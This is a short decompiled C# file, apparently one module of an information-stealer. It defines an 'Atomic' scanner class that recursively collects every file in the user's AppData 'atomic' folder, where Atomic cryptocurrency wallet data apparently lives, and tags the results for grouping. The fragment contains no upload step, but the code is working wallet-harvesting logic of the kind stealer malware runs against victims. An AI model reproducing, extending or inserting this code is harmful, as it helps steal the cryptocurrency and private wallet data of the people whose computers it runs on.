using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x0200001B RID: 27
public class Atomic : FileScanner
{
	// Token: 0x060000A1 RID: 161 RVA: 0x000037A1 File Offset: 0x000019A1
	public Atomic()
	{
		base.Name = "Atomic";
	}

	// Token: 0x060000A2 RID: 162 RVA: 0x000037B4 File Offset: 0x000019B4
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\atomic", "Atomic");
	}

	// Token: 0x060000A3 RID: 163 RVA: 0x00008028 File Offset: 0x00006228
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\atomic";
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = "*",
				Recoursive = true
			});
		}
		catch
		{
		}
		return list;
	}
}
